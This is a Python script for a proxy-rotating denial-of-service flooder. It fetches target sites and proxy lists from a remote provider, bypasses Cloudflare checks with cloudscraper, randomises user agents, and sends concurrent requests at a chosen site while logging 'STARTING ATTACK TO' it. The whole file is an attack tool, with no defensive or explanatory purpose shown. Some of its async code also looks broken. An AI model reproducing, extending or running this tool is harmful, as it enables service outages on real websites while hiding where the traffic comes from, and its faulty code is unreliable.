import asyncio
import concurrent
from sys import stderr
from concurrent.futures import ProcessPoolExecutor
from random import choice
import cloudscraper
from argparse import ArgumentParser
from loguru import logger
from pyuseragents import random as random_agent
from remote_provider import RemoteProvider
from settings import get_settings

settings = get_settings()
parser = ArgumentParser()
parser.add_argument('threads', nargs='?', default=settings.DEFAULT_THREADS)
parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
parser.set_defaults(verbose=False)
parser.add_argument("-lo", "--logger-output", dest="logger_output")
parser.add_argument("-lr", "--logger-results", dest="logger_results")
parser.set_defaults(no_clear=False)
parser.set_defaults(proxy_view=False)
parser.set_defaults(logger_output=stderr)
parser.set_defaults(logger_results=stderr)
args, unknown = parser.parse_known_args()
no_clear = args.no_clear
proxy_view = args.proxy_view

provider = RemoteProvider(args.targets)


def set_logger_format():
    logger.remove()
    logger.add(
        args.logger_output,
        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
            <cyan>{line}</cyan> - <white>{message}</white>"
    )
    logger.add(
        args.logger_results,
        format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> |\
            <cyan>{line}</cyan> - <white>{message}</white>",
        level="SUCCESS"
    )


async def fetch_url(scraper, site):
    try:
        async with scraper.get(site, timeout=settings.READ_TIMEOUT) as response:
            response = await response.read()
            return response
    except Exception as e:
        logger.info(str(e))
        return None


async def fetch_async(scraper, site):
    tasks = []
    for proxy in provider.get_proxies():
        scrapper_proxies = dict(
            http=f'http://{proxy["auth"]}@{proxy["ip"]}',
            https=f'https://{proxy["auth"]}@{proxy["ip"]}'
        )
        scraper.proxies.update(scrapper_proxies)
        task = asyncio.ensure_future(fetch_url(scraper, site))
        tasks.append(task)
        scraper.proxies.clear()
    responses = await asyncio.gather(*tasks)
    return responses


def attack_subprocess(site: str):
    scrapper = cloudscraper.create_scraper(browser=settings.BROWSER)
    headers = settings.HEADERS_TEMPLATE
    headers['User-Agent'] = random_agent()
    scrapper.headers.update(headers)
    logger.info(f"STARTING ATTACK TO  {site}")
    requests_loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(fetch_async(scrapper, site))
    requests_loop.run_until_complete(future)
    responses = future.result()
    print(responses)


if __name__ == '__main__':
    set_logger_format()
    sites = provider.get_target_sites()
    with ProcessPoolExecutor() as executor:
        processes = [executor.submit(attack_subprocess, choice(sites)) for _ in range(1)]
